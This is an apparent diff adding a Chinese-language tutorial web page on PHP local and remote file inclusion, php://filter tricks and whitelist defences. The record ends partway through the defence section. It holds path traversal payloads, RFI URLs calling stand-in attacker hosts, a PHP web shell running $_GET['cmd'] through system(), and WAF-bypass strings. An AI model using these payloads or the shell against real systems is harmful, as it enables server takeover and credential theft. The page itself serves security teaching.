@@ -1,0 +1,1385 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHP 文件包含漏洞與安全防護 - 網站安全教學</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Microsoft JhengHei', 'PingFang TC', Arial, sans-serif;
+            line-height: 1.8;
+            color: #333;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            overflow: hidden;
+        }
+
+        header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 40px;
+            text-align: center;
+        }
+
+        header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+
+        header p {
+            font-size: 1.2em;
+            opacity: 0.9;
+        }
+
+        nav {
+            background: #f8f9fa;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap;
+            border-bottom: 2px solid #e9ecef;
+        }
+
+        nav button {
+            background: white;
+            border: 2px solid #667eea;
+            color: #667eea;
+            padding: 12px 25px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+
+        nav button:hover {
+            background: #667eea;
+            color: white;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
+        }
+
+        nav button.active {
+            background: #667eea;
+            color: white;
+        }
+
+        .content {
+            padding: 40px;
+        }
+
+        .section {
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+
+        .section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        h2 {
+            color: #667eea;
+            font-size: 2em;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 3px solid #667eea;
+        }
+
+        h3 {
+            color: #764ba2;
+            font-size: 1.5em;
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+
+        .info-box {
+            background: #f8f9fa;
+            border-left: 5px solid #667eea;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .warning-box {
+            background: #fff3cd;
+            border-left: 5px solid #ff9800;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .danger-box {
+            background: #f8d7da;
+            border-left: 5px solid #dc3545;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .success-box {
+            background: #d4edda;
+            border-left: 5px solid #28a745;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 5px;
+        }
+
+        .code-block {
+            background: #282c34;
+            color: #abb2bf;
+            padding: 20px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .code-block pre {
+            margin: 0;
+            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+            font-size: 0.95em;
+            line-height: 1.6;
+        }
+
+        .code-label {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #667eea;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 15px;
+            font-size: 0.85em;
+            font-weight: bold;
+        }
+
+        .keyword { color: #c678dd; }
+        .string { color: #98c379; }
+        .function { color: #61afef; }
+        .comment { color: #5c6370; font-style: italic; }
+        .variable { color: #e06c75; }
+
+        ul, ol {
+            margin: 15px 0;
+            padding-left: 30px;
+        }
+
+        li {
+            margin: 10px 0;
+        }
+
+        .example-container {
+            background: #f8f9fa;
+            padding: 25px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+
+        .example-title {
+            font-weight: bold;
+            color: #667eea;
+            margin-bottom: 15px;
+            font-size: 1.1em;
+        }
+
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+
+        .comparison-table th,
+        .comparison-table td {
+            border: 1px solid #dee2e6;
+            padding: 15px;
+            text-align: left;
+        }
+
+        .comparison-table th {
+            background: #667eea;
+            color: white;
+            font-weight: bold;
+        }
+
+        .comparison-table tr:nth-child(even) {
+            background: #f8f9fa;
+        }
+
+        footer {
+            background: #343a40;
+            color: white;
+            text-align: center;
+            padding: 30px;
+            margin-top: 40px;
+        }
+
+        .interactive-demo {
+            background: white;
+            border: 2px solid #667eea;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .demo-input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #dee2e6;
+            border-radius: 5px;
+            font-size: 1em;
+            margin: 10px 0;
+            font-family: 'Consolas', monospace;
+        }
+
+        .demo-button {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: bold;
+            margin: 10px 5px 10px 0;
+            transition: all 0.3s;
+        }
+
+        .demo-button:hover {
+            background: #764ba2;
+            transform: translateY(-2px);
+        }
+
+        .demo-output {
+            background: #282c34;
+            color: #98c379;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 15px;
+            min-height: 60px;
+            font-family: 'Consolas', monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .attack-flow {
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+            margin: 30px 0;
+            flex-wrap: wrap;
+        }
+
+        .flow-step {
+            background: #f8f9fa;
+            border: 2px solid #667eea;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            min-width: 200px;
+            margin: 10px;
+        }
+
+        .flow-arrow {
+            font-size: 2em;
+            color: #667eea;
+            margin: 0 10px;
+        }
+
+        @media (max-width: 768px) {
+            .content {
+                padding: 20px;
+            }
+
+            header h1 {
+                font-size: 1.8em;
+            }
+
+            nav {
+                flex-direction: column;
+            }
+
+            nav button {
+                width: 100%;
+            }
+
+            .flow-arrow {
+                transform: rotate(90deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔒 PHP 文件包含漏洞與安全防護</h1>
+            <p>LFI、RFI 漏洞原理與 PHP Filter 實戰教學</p>
+        </header>
+
+        <nav>
+            <button class="nav-btn active" data-section="intro">課程簡介</button>
+            <button class="nav-btn" data-section="lfi">LFI 本地文件包含</button>
+            <button class="nav-btn" data-section="rfi">RFI 遠端文件包含</button>
+            <button class="nav-btn" data-section="filter">PHP Filter 進階技巧</button>
+            <button class="nav-btn" data-section="defense">防禦措施</button>
+        </nav>
+
+        <div class="content">
+            <!-- 課程簡介 -->
+            <section id="intro" class="section active">
+                <h2>📚 課程簡介</h2>
+                
+                <div class="info-box">
+                    <strong>學習目標：</strong>
+                    <ul>
+                        <li>理解 PHP 文件包含機制的運作原理</li>
+                        <li>掌握 LFI 和 RFI 漏洞的攻擊手法</li>
+                        <li>學習使用 PHP Filter 進行高階攻擊</li>
+                        <li>建立完整的安全防護機制</li>
+                    </ul>
+                </div>
+
+                <h3>什麼是文件包含漏洞？</h3>
+                <p>文件包含漏洞（File Inclusion Vulnerability）是 Web 應用程式中常見的安全漏洞之一。當應用程式允許使用者輸入的參數直接用於文件包含函數，而沒有進行適當的過濾和驗證時，攻擊者就可能利用這個漏洞來讀取伺服器上的敏感文件，甚至執行任意程式碼。</p>
+
+                <h3>PHP 文件包含函數</h3>
+                <p>PHP 提供了多個文件包含函數，這些都可能成為攻擊的目標：</p>
+                
+                <div class="example-container">
+                    <div class="code-block">
+                        <div class="code-label">PHP</div>
+                        <pre><span class="comment">// 主要的文件包含函數</span>
+<span class="function">include</span>(<span class="string">'file.php'</span>);      <span class="comment">// 包含文件，找不到時發出警告但繼續執行</span>
+<span class="function">include_once</span>(<span class="string">'file.php'</span>); <span class="comment">// 只包含一次</span>
+<span class="function">require</span>(<span class="string">'file.php'</span>);      <span class="comment">// 包含文件，找不到時產生致命錯誤</span>
+<span class="function">require_once</span>(<span class="string">'file.php'</span>); <span class="comment">// 只包含一次</span></pre>
+                    </div>
+                </div>
+
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>漏洞類型</th>
+                            <th>說明</th>
+                            <th>危險程度</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>LFI (Local File Inclusion)</strong></td>
+                            <td>本地文件包含 - 攻擊者可以讀取伺服器上的本地文件</td>
+                            <td>⚠️ 高</td>
+                        </tr>
+                        <tr>
+                            <td><strong>RFI (Remote File Inclusion)</strong></td>
+                            <td>遠端文件包含 - 攻擊者可以包含遠端伺服器上的惡意程式碼</td>
+                            <td>🔴 極高</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </section>
+
+            <!-- LFI 本地文件包含 -->
+            <section id="lfi" class="section">
+                <h2>📂 LFI - 本地文件包含漏洞</h2>
+
+                <h3>漏洞原理</h3>
+                <p>LFI（Local File Inclusion）允許攻擊者讀取伺服器上的本地文件。當網站使用使用者輸入來決定要包含哪個文件時，如果沒有適當的驗證，攻擊者就可以讀取敏感資料。</p>
+
+                <div class="example-container">
+                    <div class="example-title">❌ 存在漏洞的程式碼範例</div>
+                    <div class="code-block">
+                        <div class="code-label">PHP - 有漏洞</div>
+                        <pre><span class="comment">// 危險！直接使用使用者輸入</span>
+<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">'page'</span>];
+<span class="function">include</span>(<span class="variable">$page</span> . <span class="string">'.php'</span>);</pre>
+                    </div>
+                </div>
+
+                <div class="attack-flow">
+                    <div class="flow-step">
+                        <strong>正常請求</strong><br>
+                        ?page=about
+                    </div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">
+                        <strong>包含文件</strong><br>
+                        include('about.php')
+                    </div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">
+                        <strong>✅ 正常顯示</strong><br>
+                        關於我們頁面
+                    </div>
+                </div>
+
+                <h3>常見的 LFI 攻擊手法</h3>
+
+                <div class="danger-box">
+                    <strong>⚠️ 以下為攻擊範例，僅供教學使用</strong>
+                </div>
+
+                <h4>1. 路徑遍歷攻擊（Directory Traversal）</h4>
+                <div class="example-container">
+                    <div class="code-block">
+                        <div class="code-label">攻擊範例</div>
+                        <pre><span class="comment">// 使用 ../ 來向上移動目錄</span>
+?page=../../../../etc/passwd
+
+<span class="comment">// 實際執行的程式碼</span>
+<span class="function">include</span>(<span class="string">'../../../../etc/passwd.php'</span>);
+
+<span class="comment">// 讀取 Linux 系統的密碼文件</span>
+?page=../../../../etc/passwd%00
+
+<span class="comment">// %00 是空字節注入，可以截斷後面的 .php</span></pre>
+                    </div>
+                </div>
+
+                <h4>2. 絕對路徑攻擊</h4>
+                <div class="example-container">
+                    <div class="code-block">
+                        <div class="code-label">攻擊範例</div>
+                        <pre><span class="comment">// 直接使用絕對路徑</span>
+?page=/etc/passwd
+?page=/var/www/html/config.php
+?page=/var/log/apache2/access.log
+
+<span class="comment">// Windows 系統</span>
+?page=C:\Windows\System32\drivers\etc\hosts
+?page=C:\xampp\htdocs\config.php</pre>
+                    </div>
+                </div>
+
+                <h4>3. 包裝器（Wrapper）攻擊</h4>
+                <div class="example-container">
+                    <div class="code-block">
+                        <div class="code-label">攻擊範例</div>
+                        <pre><span class="comment">// 使用 PHP 包裝器讀取文件</span>
+?page=php://filter/read=convert.base64-encode/resource=config.php
+
+<span class="comment">// 這會將 config.php 以 base64 編碼輸出，避免被執行</span></pre>
+                    </div>
+                </div>
+
+                <h3>常見目標文件</h3>
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>文件路徑</th>
+                            <th>內容說明</th>
+                            <th>系統</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>/etc/passwd</td>
+                            <td>使用者帳號資訊</td>
+                            <td>Linux/Unix</td>
+                        </tr>
+                        <tr>
+                            <td>/etc/shadow</td>
+                            <td>雜湊後的密碼（需要高權限）</td>
+                            <td>Linux/Unix</td>
+                        </tr>
+                        <tr>
+                            <td>/var/log/apache2/access.log</td>
+                            <td>Apache 訪問日誌</td>
+                            <td>Linux/Unix</td>
+                        </tr>
+                        <tr>
+                            <td>/proc/self/environ</td>
+                            <td>環境變數（可能包含敏感資訊）</td>
+                            <td>Linux/Unix</td>
+                        </tr>
+                        <tr>
+                            <td>C:\Windows\win.ini</td>
+                            <td>Windows 配置文件</td>
+                            <td>Windows</td>
+                        </tr>
+                        <tr>
+                            <td>C:\xampp\passwords.txt</td>
+                            <td>XAMPP 密碼文件</td>
+                            <td>Windows</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="interactive-demo">
+                    <h4>🔬 互動式示範：LFI 攻擊模擬</h4>
+                    <p>輸入想要包含的文件路徑（模擬環境）：</p>
+                    <input type="text" class="demo-input" id="lfiInput" placeholder="例如：../../../../etc/passwd" value="../../../../etc/passwd">
+                    <button class="demo-button" onclick="simulateLFI()">執行 LFI 攻擊</button>
+                    <button class="demo-button" onclick="clearLFI()">清除</button>
+                    <div class="demo-output" id="lfiOutput">等待輸入...</div>
+                </div>
+            </section>
+
+            <!-- RFI 遠端文件包含 -->
+            <section id="rfi" class="section">
+                <h2>🌐 RFI - 遠端文件包含漏洞</h2>
+
+                <h3>漏洞原理</h3>
+                <p>RFI（Remote File Inclusion）比 LFI 更危險，因為攻擊者可以包含來自遠端伺服器的惡意程式碼。這需要 PHP 設定中的 <code>allow_url_include</code> 選項被啟用。</p>
+
+                <div class="warning-box">
+                    <strong>⚠️ 重要說明：</strong>
+                    <ul>
+                        <li>PHP 5.2.0 之後，<code>allow_url_include</code> 預設為 Off</li>
+                        <li>即使關閉，仍然可能透過其他方式達到類似效果</li>
+                        <li>RFI 可以直接執行任意程式碼，危險性極高</li>
+                    </ul>
+                </div>
+
+                <div class="example-container">
+                    <div class="example-title">❌ 存在 RFI 漏洞的程式碼</div>
+                    <div class="code-block">
+                        <div class="code-label">PHP - 有漏洞</div>
+                        <pre><span class="comment">// 危險！允許包含遠端文件</span>
+<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">'page'</span>];
+<span class="function">include</span>(<span class="variable">$page</span>);
+
+<span class="comment">// php.ini 設定</span>
+<span class="comment">// allow_url_include = On  ← 非常危險！</span></pre>
+                    </div>
+                </div>
+
+                <h3>RFI 攻擊流程</h3>
+                <div class="attack-flow">
+                    <div class="flow-step">
+                        <strong>1️⃣ 攻擊者準備</strong><br>
+                        在自己的伺服器<br>
+                        建立惡意 PHP 文件
+                    </div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">
+                        <strong>2️⃣ 發起攻擊</strong><br>
+                        ?page=http://evil.com/shell.txt
+                    </div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">
+                        <strong>3️⃣ 伺服器執行</strong><br>
+                        包含並執行<br>
+                        惡意程式碼
+                    </div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step">
+                        <strong>4️⃣ 🔴 伺服器被控制</strong><br>
+                        獲得 Shell 權限
+                    </div>
+                </div>
+
+                <h3>RFI 攻擊範例</h3>
+
+                <h4>1. 基本 RFI 攻擊</h4>
+                <div class="example-container">
+                    <div class="code-block">
+                        <div class="code-label">攻擊範例</div>
+                        <pre><span class="comment">// 包含遠端的惡意 PHP 文件</span>
+?page=http://attacker.com/shell.php
+?page=https://pastebin.com/raw/malicious_code
+
+<span class="comment">// 使用 FTP 協定</span>
+?page=ftp://attacker.com/backdoor.php
+
+<span class="comment">// 使用 SMB 協定（Windows）</span>
+?page=\\attacker.com\share\evil.php</pre>
+                    </div>
+                </div>
+
+                <h4>2. 惡意文件範例（shell.txt）</h4>
+                <div class="example-container">
+                    <div class="code-block">
+                        <div class="code-label">惡意程式碼範例</div>
+                        <pre><span class="comment">// 攻擊者伺服器上的 shell.txt</span>
+<span class="keyword">&lt;?php</span>
+<span class="comment">// 簡單的 Web Shell</span>
+<span class="keyword">if</span>(<span class="function">isset</span>(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>])) {
+    <span class="function">system</span>(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]);
+}
+
+<span class="comment">// 或者上傳文件功能</span>
+<span class="function">file_put_contents</span>(<span class="string">'backdoor.php'</span>, <span class="variable">$_GET</span>[<span class="string">'code'</span>]);
+<span class="keyword">?&gt;</span></pre>
+                    </div>
+                </div>
+
+                <h4>3. 繞過副檔名限制</h4>
+                <div class="example-container">
+                    <div class="code-block">
+                        <div class="code-label">繞過技巧</div>
+                        <pre><span class="comment">// 如果程式碼強制加上 .php</span>
+<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">'page'</span>];
+<span class="function">include</span>(<span class="variable">$page</span> . <span class="string">'.php'</span>);
+
+<span class="comment">// 攻擊者可以使用空字節注入（PHP &lt; 5.3.4）</span>
+?page=http://evil.com/shell.txt<span class="variable">%00</span>
+
+<span class="comment">// 或使用問號（? 後面的內容會被當作查詢字串）</span>
+?page=http://evil.com/shell.txt<span class="variable">?</span>
+
+<span class="comment">// 最終執行：</span>
+<span class="function">include</span>(<span class="string">'http://evil.com/shell.txt?.php'</span>);</pre>
+                    </div>
+                </div>
+
+                <h3>LFI vs RFI 比較</h3>
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>特性</th>
+                            <th>LFI（本地文件包含）</th>
+                            <th>RFI（遠端文件包含）</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>文件來源</strong></td>
+                            <td>伺服器本地文件</td>
+                            <td>遠端伺服器文件</td>
+                        </tr>
+                        <tr>
+                            <td><strong>前置條件</strong></td>
+                            <td>無特殊要求</td>
+                            <td>需要 allow_url_include = On</td>
+                        </tr>
+                        <tr>
+                            <td><strong>攻擊難度</strong></td>
+                            <td>中等</td>
+                            <td>較低（如果設定允許）</td>
+                        </tr>
+                        <tr>
+                            <td><strong>危險程度</strong></td>
+                            <td>高（資訊洩露）</td>
+                            <td>極高（直接執行程式碼）</td>
+                        </tr>
+                        <tr>
+                            <td><strong>常見用途</strong></td>
+                            <td>讀取敏感文件、日誌注入</td>
+                            <td>上傳 Webshell、完全控制伺服器</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="interactive-demo">
+                    <h4>🔬 互動式示範：RFI 攻擊模擬</h4>
+                    <p>輸入遠端文件 URL（模擬環境）：</p>
+                    <input type="text" class="demo-input" id="rfiInput" placeholder="例如：http://attacker.com/shell.txt" value="http://attacker.com/shell.txt">
+                    <button class="demo-button" onclick="simulateRFI()">執行 RFI 攻擊</button>
+                    <button class="demo-button" onclick="clearRFI()">清除</button>
+                    <div class="demo-output" id="rfiOutput">等待輸入...</div>
+                </div>
+            </section>
+
+            <!-- PHP Filter -->
+            <section id="filter" class="section">
+                <h2>🔧 PHP Filter - 進階攻擊技巧</h2>
+
+                <h3>什麼是 PHP Filter？</h3>
+                <p>PHP Filter 是 PHP 內建的一種協議包裝器（Protocol Wrapper），可以在讀取文件時對內容進行各種轉換和過濾。在安全測試中，PHP Filter 常被用於繞過某些防護機制，特別是在 LFI 攻擊中。</p>
+
+                <div class="info-box">
+                    <strong>💡 為什麼要使用 PHP Filter？</strong>
+                    <ul>
+                        <li>直接包含 PHP 文件會被執行，看不到原始碼</li>
+                        <li>使用 Filter 可以將 PHP 文件以編碼形式輸出</li>
+                        <li>可以繞過某些字串過濾機制</li>
+                        <li>支援多種編碼和轉換方式</li>
+                    </ul>
+                </div>
+
+                <h3>PHP Filter 基本語法</h3>
+                <div class="example-container">
+                    <div class="code-block">
+                        <div class="code-label">基本語法</div>
+                        <pre><span class="comment">// 基本格式</span>
+php://filter/read=<span class="string">過濾器名稱</span>/resource=<span class="string">文件路徑</span>
+
+<span class="comment">// 完整格式</span>
+php://filter/convert.<span class="string">轉換類型</span>.<span class="string">編碼方式</span>/resource=<span class="string">目標文件</span></pre>
+                    </div>
+                </div>
+
+                <h3>常用的 PHP Filter</h3>
+
+                <h4>1. Base64 編碼過濾器（最常用）</h4>
+                <div class="example-container">
+                    <div class="example-title">讀取 PHP 原始碼</div>
+                    <div class="code-block">
+                        <div class="code-label">攻擊範例</div>
+                        <pre><span class="comment">// 問題：直接包含 config.php 會被執行，看不到內容</span>
+?page=config.php  <span class="comment">← 文件被執行，無法看到原始碼</span>
+
+<span class="comment">// 解決：使用 base64 編碼讀取</span>
+?page=php://filter/read=convert.base64-encode/resource=config.php
+
+<span class="comment">// 或使用簡寫</span>
+?page=php://filter/convert.base64-encode/resource=config.php</pre>
+                    </div>
+                </div>
+
+                <div class="example-container">
+                    <div class="example-title">實際操作流程</div>
+                    <div class="code-block">
+                        <div class="code-label">步驟說明</div>
+                        <pre><span class="comment">// 步驟 1: 使用 filter 獲取 base64 編碼的內容</span>
+瀏覽器輸入：
+http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config
+
+<span class="comment">// 步驟 2: 取得輸出結果（base64 編碼）</span>
+輸出：PD9waHAKJGRiX2hvc3QgPSAibG9jYWxob3N0IjsKJGRiX3VzZXI...
+
+<span class="comment">// 步驟 3: 使用 base64 解碼工具解碼</span>
+解碼後：
+<span class="keyword">&lt;?php</span>
+<span class="variable">$db_host</span> = <span class="string">"localhost"</span>;
+<span class="variable">$db_user</span> = <span class="string">"admin"</span>;
+<span class="variable">$db_pass</span> = <span class="string">"P@ssw0rd123"</span>;  <span class="comment">← 成功讀取敏感資訊！</span>
+<span class="keyword">?&gt;</span></pre>
+                    </div>
+                </div>
+
+                <h4>2. ROT13 編碼過濾器</h4>
+                <div class="example-container">
+                    <div class="code-block">
+                        <div class="code-label">ROT13 範例</div>
+                        <pre><span class="comment">// ROT13 是一種簡單的字母替換加密</span>
+?page=php://filter/read=string.rot13/resource=config.php
+
+<span class="comment">// 優點：輸出仍是文字，較容易閱讀</span>
+<span class="comment">// 缺點：只能處理字母，數字和符號不變</span></pre>
+                    </div>
+                </div>
+
+                <h4>3. 組合多個過濾器（鏈式調用）</h4>
+                <div class="example-container">
+                    <div class="code-block">
+                        <div class="code-label">鏈式過濾器</div>
+                        <pre><span class="comment">// 可以使用管道符號 | 組合多個過濾器</span>
+?page=php://filter/read=string.rot13|convert.base64-encode/resource=config.php
+
+<span class="comment">// 執行順序：先 ROT13，再 Base64 編碼</span>
+
+<span class="comment">// 實際應用：繞過關鍵字檢測</span>
+?page=php://filter/convert.iconv.utf-8.utf-16/resource=config.php</pre>
+                    </div>
+                </div>
+
+                <h3>進階 PHP Filter 技巧</h3>
+
+                <h4>1. 字符編碼轉換</h4>
+                <div class="example-container">
+                    <div class="code-block">
+                        <div class="code-label">編碼轉換</div>
+                        <pre><span class="comment">// 使用 iconv 進行編碼轉換</span>
+php://filter/convert.iconv.utf-8.utf-16/resource=file.php
+php://filter/convert.iconv.utf-8.utf-16le/resource=file.php
+
+<span class="comment">// 可以用來繞過某些 WAF（Web Application Firewall）</span>
+<span class="comment">// 原理：改變字符編碼讓 WAF 無法識別惡意模式</span></pre>
+                    </div>
+                </div>
+
+                <h4>2. 壓縮過濾器</h4>
+                <div class="example-container">
+                    <div class="code-block">
+                        <div class="code-label">壓縮/解壓縮</div>
+                        <pre><span class="comment">// zlib 壓縮</span>
+php://filter/zlib.deflate/resource=file.php
+
+<span class="comment">// zlib 解壓縮</span>
+php://filter/zlib.inflate/resource=compressed_file
+
+<span class="comment">// bzip2 壓縮</span>
+php://filter/bzip2.compress/resource=file.php</pre>
+                    </div>
+                </div>
+
+                <h4>3. 字符串過濾器</h4>
+                <div class="example-container">
+                    <div class="code-block">
+                        <div class="code-label">字符串處理</div>
+                        <pre><span class="comment">// 移除標籤</span>
+php://filter/string.strip_tags/resource=file.php
+
+<span class="comment">// 轉換為大寫</span>
+php://filter/string.toupper/resource=file.php
+
+<span class="comment">// 轉換為小寫</span>
+php://filter/string.tolower/resource=file.php</pre>
+                    </div>
+                </div>
+
+                <h3>PHP Filter 攻擊實戰場景</h3>
+
+                <div class="example-container">
+                    <div class="example-title">場景 1：讀取資料庫配置文件</div>
+                    <div class="code-block">
+                        <div class="code-label">實戰範例</div>
+                        <pre><span class="comment">// 目標：獲取資料庫帳號密碼</span>
+<span class="comment">// 步驟 1：確認存在 LFI 漏洞</span>
+http://target.com/index.php?page=home
+
+<span class="comment">// 步驟 2：嘗試讀取配置文件</span>
+http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config
+
+<span class="comment">// 步驟 3：如果加了 .php 後綴，也能讀取</span>
+http://target.com/index.php?page=php://filter/convert.base64-encode/resource=../config
+
+<span class="comment">// 步驟 4：解碼 base64 輸出，獲得敏感資訊</span></pre>
+                    </div>
+                </div>
+
+                <div class="example-container">
+                    <div class="example-title">場景 2：繞過黑名單過濾</div>
+                    <div class="code-block">
+                        <div class="code-label">繞過技巧</div>
+                        <pre><span class="comment">// 假設伺服器過濾了 "php://" 字串</span>
+<span class="variable">$page</span> = <span class="function">str_replace</span>(<span class="string">"php://"</span>, <span class="string">""</span>, <span class="variable">$_GET</span>[<span class="string">'page'</span>]);
+
+<span class="comment">// 攻擊者可以使用雙寫繞過</span>
+?page=phphp://p://filter/convert.base64-encode/resource=config
+
+<span class="comment">// 或使用大小寫混合（如果過濾區分大小寫）</span>
+?page=PHP://filter/convert.base64-encode/resource=config
+?page=PhP://filter/convert.base64-encode/resource=config</pre>
+                    </div>
+                </div>
+
+                <h3>所有 PHP Filter 列表</h3>
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>過濾器類型</th>
+                            <th>語法</th>
+                            <th>用途</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Base64 編碼</td>
+                            <td>convert.base64-encode</td>
+                            <td>讀取 PHP 原始碼（最常用）</td>
+                        </tr>
+                        <tr>
+                            <td>Base64 解碼</td>
+                            <td>convert.base64-decode</td>
+                            <td>解碼 Base64 內容</td>
+                        </tr>
+                        <tr>
+                            <td>ROT13</td>
+                            <td>string.rot13</td>
+                            <td>字母旋轉加密</td>
+                        </tr>
+                        <tr>
+                            <td>大寫轉換</td>
+                            <td>string.toupper</td>
+                            <td>轉換為大寫</td>
+                        </tr>
+                        <tr>
+                            <td>小寫轉換</td>
+                            <td>string.tolower</td>
+                            <td>轉換為小寫</td>
+                        </tr>
+                        <tr>
+                            <td>移除標籤</td>
+                            <td>string.strip_tags</td>
+                            <td>移除 HTML/PHP 標籤</td>
+                        </tr>
+                        <tr>
+                            <td>編碼轉換</td>
+                            <td>convert.iconv.*</td>
+                            <td>字符編碼轉換</td>
+                        </tr>
+                        <tr>
+                            <td>Zlib 壓縮</td>
+                            <td>zlib.deflate</td>
+                            <td>壓縮內容</td>
+                        </tr>
+                        <tr>
+                            <td>Zlib 解壓</td>
+                            <td>zlib.inflate</td>
+                            <td>解壓內容</td>
+                        </tr>
+                        <tr>
+                            <td>Bzip2 壓縮</td>
+                            <td>bzip2.compress</td>
+                            <td>Bzip2 壓縮</td>
+                        </tr>
+                        <tr>
+                            <td>Bzip2 解壓</td>
+                            <td>bzip2.decompress</td>
+                            <td>Bzip2 解壓</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="interactive-demo">
+                    <h4>🔬 互動式示範：PHP Filter Base64 編碼/解碼</h4>
+                    <p>輸入要編碼的文字（模擬 PHP 程式碼）：</p>
+                    <textarea class="demo-input" id="filterInput" rows="4" placeholder="例如：<?php $password = 'secret123'; ?>"><?php $db_password = "MyS3cr3tP@ss"; ?></textarea>
+                    <button class="demo-button" onclick="encodeBase64()">Base64 編碼</button>
+                    <button class="demo-button" onclick="decodeBase64()">Base64 解碼</button>
+                    <button class="demo-button" onclick="clearFilter()">清除</button>
+                    <div class="demo-output" id="filterOutput">等待輸入...</div>
+                </div>
+            </section>
+
+            <!-- 防禦措施 -->
+            <section id="defense" class="section">
+                <h2>🛡️ 防禦措施與最佳實踐</h2>
+
+                <div class="success-box">
+                    <strong>✅ 核心防禦原則：</strong>
+                    <ul>
+                        <li><strong>輸入驗證</strong>：永遠不要信任使用者輸入</li>
+                        <li><strong>白名單機制</strong>：只允許預期的輸入值</li>
+                        <li><strong>最小權限原則</strong>：限制文件訪問權限</li>
+                        <li><strong>禁用危險功能</strong>：關閉不必要的 PHP 功能</li>
+                    </ul>
+                </div>
+
+                <h3>1. 使用白名單驗證</h3>
+                <div class="example-container">
+                    <div class="example-title">✅ 安全的程式碼範例</div>
+                    <div class="code-block">
+                        <div class="code-label">PHP - 白名單方式</div>
+                        <pre><span class="keyword">&lt;?php</span>
+<span class="comment">// 定義允許的頁面白名單</span>
+<span class="variable">$allowed_pages</span> = [
+    <span class="string">'home'</span>,
+    <span class="string">'about'</span>,
+    <span class="string">'contact'</span>,
+    <span class="string">'products'</span>
+];
+
+<span class="comment">// 獲取使用者輸入</span>
+<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">'page'</span>] ?? <span class="string">'home'</span>;
+
+<span class="comment">// 驗證是否在白名單中</span>
+<span class="keyword">if</span> (<span class="function">in_array</span>(<span class="variable">$page</span>, <span class="variable">$allowed_pages</span>, <span class="keyword">true</span>)) {
+    <span class="comment">// 安全地包含文件</span>
+    <span class="function">include</span>(<span class="string">"pages/"</span> . <span class="variable">$page</span> . <span class="string">".php"</span>);
+} <span class="keyword">else</span> {
+    <span class="comment">// 不在白名單中，顯示錯誤頁面</span>
+    <span class="function">include</span>(<span class="string">"pages/404.php"</span>);
+}
+<span class="keyword">?&gt;</span></pre>
+                    </div>
+                </div>
+
+                <h3>2. 過濾危險字符</h3>
+                <div class="example-container">
